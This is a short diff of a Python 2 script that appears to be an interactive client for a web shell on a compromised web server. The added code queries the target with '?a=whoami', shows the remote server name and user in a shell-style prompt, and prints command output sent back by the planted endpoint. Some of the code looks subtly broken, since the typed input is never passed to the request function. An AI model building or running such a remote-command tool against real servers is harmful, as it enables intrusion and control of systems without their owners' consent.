@@ -48,15 +48,23 @@ def target(url):
 	else:
 		print "No response"
 		sys.exit(2)
-
-
+		
+def server_info():
+	targer = urllib.urlopen(url+"?a=whoami")
+	if targer.getcode() == 200:
+		htmlSource = targer.read()
+		j = json.loads(htmlSource)
+		return j['server_info']
+		
 def terminal(input):
 	if input == "exit":
 		print "Bye :)"
 		sys.exit(2)
 	return target(url)
 
+server_info = server_info()
+
 while True:
-	input = raw_input("#>")
+	input = raw_input(server_info['server_name']+"@"+server_info['user']+server_info['user_bash']+">")
 	termina = terminal(input)
 	print termina['command']
